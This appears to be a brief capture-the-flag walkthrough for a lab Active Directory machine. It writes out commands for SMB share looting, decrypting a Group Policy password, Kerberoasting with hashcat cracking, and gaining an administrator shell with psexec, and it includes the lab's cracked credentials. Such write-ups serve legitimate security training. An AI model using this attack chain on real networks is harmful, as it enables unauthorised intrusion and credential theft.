# Enumeration
- Use nmap to enumerate the ports ` sudo nmap -T5 10.10.10.100` ![](attachment/e29cc017f1c7ae9344dc1931ad064407.png)
- `smbclient  -L \\\\10.10.10.100` gives all smb shares:![](attachment/99f5e760d90614c7817e249fb8b80a90.png)
# Exploitation
- `smbclient \\\\10.10.10.100\\Replication` to get into replication then 
	```
	smb: \> prompt off
	smb: \> recurse on
	smb: \> mget *
	```
	To download all the files
	
 - Then u get the Groups.xml file in active.htb folder
 - Copy password from Groups.xml then use gpp-decrypt the password
	 `gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`![](attachment/691db1c4894646d1e5d25afa4347ef9e.png)
-  **active.htb\SVC_TGS**-we also have the username from the groups.xml file
- trying to use psexec we get no write permission
- Then using [[Active Directory/Post Compromise Attacks/Kerberoasting]] we get a hash 
- Using hashcat to crack the hash we get the password `Ticketmaster1968` ![](attachment/52b7d51541eba535f736ae2a0d999f86.png)
- We got the password for the following admin user![](attachment/d7e18ed7a01958a69b8e61edbd45db6c.png)
- Then using psexec to get a shell: `psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100`
	We get a root shell![](attachment/a8f16a189aeb7d18b66b635e490df774.png)